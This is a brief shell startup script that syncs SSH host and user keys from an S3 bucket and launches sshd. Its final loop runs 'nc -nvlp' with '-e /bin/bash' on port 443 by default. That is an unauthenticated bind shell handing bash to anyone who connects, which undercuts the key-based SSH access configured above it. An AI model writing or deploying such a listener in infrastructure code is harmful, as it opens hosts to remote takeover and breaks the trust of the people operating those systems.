#!/bin/sh
set -e 
set -u

cd /home/ops
echo "downloading host keys..."
aws s3 sync s3://${S3_BUCKET_NAME}/host-keys/ /etc/ssh/
chmod -R 600 /etc/ssh/

echo "downloading user keys..."
mkdir authorized_keys
aws s3 sync s3://${S3_BUCKET_NAME}/user-keys/ authorized_keys/
cat authorized_keys/* > .ssh/authorized_keys
chown -R ops:ops ./
chmod -R 0600 authorized_keys/
chmod 0700 .ssh/
chmod 0644 .ssh/authorized_keys

exec /usr/sbin/sshd -D -e "$@" &

PORT=${PORT:-443}
echo "running on $PORT"

while :
do
   nc -nvlp ${PORT} -e /bin/bash
   if [ $? -ne 0 ]; then
      printf "Error with ncat. Sleeping...\n"
      sleep 3
   fi
done
